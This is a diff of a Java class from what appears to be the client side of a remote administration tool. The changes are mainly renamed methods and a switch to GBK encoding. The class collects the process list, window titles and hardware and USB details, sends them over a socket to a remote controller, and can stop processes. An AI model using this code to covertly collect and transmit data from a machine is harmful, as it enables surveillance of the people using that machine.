@@ -1,6 +1,5 @@
 package me.client.send;
 
-import com.sun.jna.NativeLong;
 import com.sun.jna.Pointer;
 import com.sun.jna.platform.win32.Kernel32;
 import com.sun.jna.platform.win32.User32;
@@ -8,6 +7,7 @@ import com.sun.jna.platform.win32.WinDef;
 import com.sun.jna.platform.win32.WinNT;
 import com.sun.jna.ptr.IntByReference;
 import me.client.utils.LoadDLL;
+import me.client.utils.LoadUser32;
 import me.client.utils.MessageFlags;
 import me.client.utils.SendMessage;
 import oshi.SystemInfo;
@@ -18,8 +18,8 @@ import oshi.software.os.OSProcess;
 import oshi.software.os.OperatingSystem;
 import oshi.util.FormatUtil;
 
+import java.io.UnsupportedEncodingException;
 import java.net.Socket;
-import java.nio.charset.StandardCharsets;
 import java.util.List;
 
 public class SystemManager {
@@ -28,7 +28,7 @@ public class SystemManager {
             this.socket = socket;
         }
         public void showTaskList() {
-            SendMessage.SendHead(MessageFlags.SHOW_TASKLIST,socket);
+            SendMessage.sendHead(MessageFlags.SHOW_TASKLIST,socket);
         }
     public void updateTaskList() {
         SystemInfo systemInfo = new SystemInfo();
@@ -41,7 +41,7 @@ public class SystemManager {
                         100d * (p.getKernelTime() + p.getUserTime()) / p.getUpTime(),
                         100d * p.getResidentSetSize() / hal.getMemory().getTotal(), FormatUtil.formatBytes(p.getVirtualSize()),
                         FormatUtil.formatBytes(p.getResidentSetSize()), p.getProcessID(),p.getPath()) + "\n";
-                SendMessage.Send(MessageFlags.UPDATE_TASKLIST,context.getBytes( ),socket);
+                SendMessage.send(MessageFlags.UPDATE_TASKLIST,context.getBytes( "GBK"),socket);
             }
         }catch (Exception e) {
         }
@@ -55,8 +55,11 @@ public class SystemManager {
             } else {
                 char[] lpString = new char[260];
                 User32.INSTANCE.GetWindowText(hWnd, lpString, 260);
-                String str =User32.INSTANCE.GetWindowThreadProcessId(hWnd,intByReference) +"|" + LoadDLL.instance.GetWindowsID(hWnd) + "|" + String.valueOf(lpString);
-                SendMessage.Send(MessageFlags.ENUM_WINDOWS,str.getBytes(),socket);
+                String str =User32.INSTANCE.GetWindowThreadProcessId(hWnd,intByReference) +"|" + LoadDLL.instance.GetHWND(hWnd) + "|" + String.valueOf(lpString);
+                try {
+                    SendMessage.send(MessageFlags.ENUM_WINDOWS,str.getBytes("GBK"),socket);
+                } catch (UnsupportedEncodingException e) {
+                }
             }
             return true;
         }, pointer);
@@ -92,13 +95,13 @@ public class SystemManager {
         HardwareAbstractionLayer hardwareAbstractionLayer = systemInfo.getHardware();
         return hardwareAbstractionLayer.getUsbDevices(true);
     }
-    public void sendSystemInfo() {
-        SendMessage.Send(MessageFlags.UPDATE_SYSTEMINFO,("操作系统|"+getSystem()).getBytes( ),socket);
-        SendMessage.Send(MessageFlags.UPDATE_SYSTEMINFO,("CPU|" + getCPUName()).getBytes( ),socket);
-        SendMessage.Send(MessageFlags.UPDATE_SYSTEMINFO,("硬盘|" + getDisk()).getBytes( ),socket);
-        SendMessage.Send(MessageFlags.UPDATE_SYSTEMINFO,("设备制造商|" + getManufacturer()).getBytes( ),socket);
+    public void sendSystemInfo() throws UnsupportedEncodingException {
+        SendMessage.send(MessageFlags.UPDATE_SYSTEMINFO,("操作系统|"+getSystem()).getBytes("GBK" ),socket);
+        SendMessage.send(MessageFlags.UPDATE_SYSTEMINFO,("CPU|" + getCPUName()).getBytes("GBK" ),socket);
+        SendMessage.send(MessageFlags.UPDATE_SYSTEMINFO,("硬盘|" + getDisk()).getBytes( "GBK"),socket);
+        SendMessage.send(MessageFlags.UPDATE_SYSTEMINFO,("设备制造商|" + getManufacturer()).getBytes("GBK" ),socket);
         for(UsbDevice device:getUSB()) {
-            SendMessage.Send(MessageFlags.UPDATE_SYSTEMINFO,("USB|" + device.getName()).getBytes( ),socket);
+            SendMessage.send(MessageFlags.UPDATE_SYSTEMINFO,("USB|" + device.getName()).getBytes( "GBK"),socket);
         }
     }
     public static void stopProcess(int PID) {
